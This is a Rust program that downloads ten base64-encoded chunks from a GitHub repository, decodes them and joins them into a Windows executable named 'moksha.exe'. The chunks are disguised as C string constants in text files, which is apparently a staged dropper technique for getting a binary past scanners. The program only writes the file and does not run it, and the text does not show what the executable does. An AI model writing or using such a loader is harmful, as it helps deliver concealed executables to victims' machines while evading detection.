use reqwest::blocking::get;
use std::fs::File;
use std::io::{self, Write};

fn main() -> io::Result<()> {
    let base_url = "https://raw.githubusercontent.com/climax0x/study_0x/main/part";
    let num_parts = 10; // total number of parts
    let mut executable_parts: Vec<Vec<u8>> = Vec::with_capacity(num_parts);

    // Download and decode parts
    for i in 1..=num_parts {
        let url = format!("{}{}.txt", base_url, i);
        println!("Downloading: {}", url);
        let response = get(&url).expect("Failed to download file");
        let content = response.text().expect("Failed to read response text");

        // Extract Base64 content, assuming the content is in the form of `const char* partN_data = "BASE64DATA";`
        let start = content.find('"').unwrap() + 1;
        let end = content.rfind('"').unwrap();
        let base64_data = &content[start..end];

        // Decode Base64 data
        let decoded_data = base64::decode(base64_data).expect("Failed to decode Base64");
        executable_parts.push(decoded_data);
    }

    // Combine all parts into one executable file
    let mut output_file = File::create("moksha.exe")?;
    for part in executable_parts {
        output_file.write_all(&part)?;
    }

    Ok(())
}
